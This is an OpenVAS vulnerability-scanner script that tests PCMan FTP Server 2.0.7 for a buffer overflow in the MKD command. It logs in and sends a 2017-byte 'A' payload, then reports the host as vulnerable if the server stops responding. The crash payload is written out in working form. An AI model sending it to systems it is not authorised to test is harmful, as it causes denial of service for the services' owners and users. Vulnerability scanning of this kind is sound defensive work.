###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pcman_ftp_server_mkd_command_bof_vuln.nasl 9552 2018-04-20 12:17:18Z cfischer $
#
# PCMAN FTP Server MKD Command Buffer Overflow vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805050");
  script_version("$Revision: 9552 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-20 14:17:18 +0200 (Fri, 20 Apr 2018) $");
  script_tag(name:"creation_date", value:"2015-02-25 12:32:52 +0530 (Wed, 25 Feb 2015)");
  script_name("PCMAN FTP Server MKD Command Buffer Overflow vulnerability");

  script_tag(name:"summary", value:"This host is running PCMAN FTP server and
  is prone to buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted huge request in MKD command
  and check whether the application is vulnerable.");

  script_tag(name:"insight", value:"Flaw is due to an improper sanitation of
  user supplied input passed via the 'MKD' command.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to cause denial of service condition resulting in loss of availability
  for the application.

  Impact Level: Application.");

  script_tag(name:"affected", value:"PCMAN FTP version 2.0.7, Other versions may
  also be affected.");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36078");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp_banner/available");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if("220 PCMan's FTP Server" >!< banner){
  exit(0);
}

user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

soc = open_sock_tcp(ftpPort);
if(!soc) exit(0);

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  exit(0);
}

PAYLOAD = crap(data: "\x41", length:2017);
send(socket:soc, data:string("MKD", PAYLOAD, '\r\n'));
ftp_close(socket:soc);

sleep(3);

soc = open_sock_tcp(ftpPort);
if(!soc)
{
  security_message(ftpPort);
  exit(0);
}

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  security_message(ftpPort);
  exit(0);
}

ftp_close(socket:soc);
